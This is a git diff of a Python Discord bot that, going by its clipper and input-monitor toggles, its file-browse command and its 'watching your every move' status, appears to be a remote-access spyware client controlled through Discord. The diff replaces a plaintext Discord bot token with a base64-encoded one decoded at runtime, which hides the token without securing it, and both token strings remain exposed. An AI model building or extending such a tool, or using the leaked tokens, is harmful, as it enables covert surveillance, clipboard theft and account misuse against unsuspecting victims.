@@ -2,15 +2,20 @@ import discord
 import sys
 import asyncio
 import signal
+import base64
 from discord.ext import commands
 from functions.help import setup_help_command
 
 clipper_active = False
 input_monitor_active = False
 
-CHANNEL_ID = 1293132121547735147
-DISCORD_TOKEN = "MTI3ODY1MjQ3NDM3MDAzMTYxNw.GoFFed.BTt1HxcZHUKO4iOSEPf_dSosQXrUO5fJsRriSE"
-SERVER_ID = 1293132121547735144
+CHANNEL_ID = 1293132121547735147  # Replace with your actual channel ID
+SERVER_ID = 1293132121547735144   # Replace with your actual server ID
+
+encoded_token = "TVRJM09EWTFNalEzTkRNM01EQXpNVFl4TncuR1BfR2ZHLnp3UUxJalk4YzZvUzJpZm1LSDU4RGNFTzEtSURyWHV4aHhDVkJ3"
+
+# Decode the token at runtime
+DISCORD_TOKEN = base64.b64decode(encoded_token).decode('utf-8')
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -23,7 +28,7 @@ def handle_shutdown_signal(signum, frame):
     asyncio.create_task(shutdown())
 
 signal.signal(signal.SIGTERM, handle_shutdown_signal)
-signal.signal(signal.SIGINT, handle_shutdown_signal)    
+signal.signal(signal.SIGINT, handle_shutdown_signal)
 
 def lazy_load_toggleable_module(module_name, submodule_name=None):
     if submodule_name:
@@ -51,6 +56,7 @@ def unload_module(module_name):
 async def on_ready():
     activity = discord.Activity(type=discord.ActivityType.watching, name="your every move 👁️")
     await bot.change_presence(status=discord.Status.online, activity=activity)
+    print(f"Logged in as {bot.user}")
 
 @bot.command(name="browse", help="Shows all directories and files in a path.")
 async def browse(ctx, *, path: str = None):
@@ -170,10 +176,9 @@ async def on_command_error(ctx, error):
         await ctx.send(f"**Error:** `{str(error)}`")
 
 def start_discord_bot():
-    global bot_event_loop
-    bot_event_loop = asyncio.get_event_loop()
     bot.run(DISCORD_TOKEN)
 
 setup_help_command(bot)
 
-bot.run(DISCORD_TOKEN)
+if __name__ == "__main__":
+    start_discord_bot()
